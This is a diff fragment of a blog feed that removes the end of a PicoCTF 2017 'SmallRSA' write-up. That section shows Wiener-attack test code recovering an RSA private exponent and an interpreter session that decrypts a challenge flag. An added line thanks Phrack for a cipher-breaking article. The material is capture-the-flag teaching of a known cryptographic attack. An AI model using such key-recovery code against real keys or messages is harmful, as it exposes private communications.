-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Testing Wiener Attack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(e,n) is (&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;hacked_d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hack_RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hacked_d = &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hacked_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-------------------------&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;test_hack_RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;With our values, we can now run this, to get desired value. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@W3ndige ~/rsa-wiener&amp;gt; python wiener-attack.py
-Testing Wiener Attack
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e,n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; 165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141 ,  380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069 &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Hacked!
-Hacked_d &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  3223594586826657550897063711914171740995144768727978698812620148084071525621&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As we now have &lt;b&gt;d&lt;/b&gt;, we can now calculate the message. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@W3ndige&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2017&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;6.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20170109&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3223594586826657550897063711914171740995144768727978698812620148084071525621&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;84740524770381403153622925447792920959815469600692319965596776738431504244164788253920072346154965475345520986566261139605189850053220984036986688956922312943484012082747435674795128749623149324459566588589685250817942108728364336944750553593289462772627326115549452684668188298340307743571301091011089977112&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;3338241147602298443253582134580600952121701496335419787655403775061762704160368620726916691837&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And lastly, decrypt it. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3338241147602298443253582134580600952121701496335419787655403775061762704160368620726916691837&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;'0x666c61677b4172655f616e795f5253415f76616c735f676f6f645f31353837383537303537377d'&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'666c61677b4172655f616e795f5253415f76616c735f676f6f645f31353837383537303537377d'&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])])&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;'flag{Are_any_RSA_vals_good_15878570577}'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we have another flag!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="PicoCTF 2017" /><summary type="html">SmallRSA - 120 PTS</summary></entry></feed>
+&lt;p&gt;Great, we broke the cipher and got the message! Thanks &lt;a href=&quot;http://www.phrack.org/issues/69/6.html#article&quot;&gt;Phrack&lt;/a&gt;! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cryptography" /><summary type="html">Introduction</summary></entry></feed>
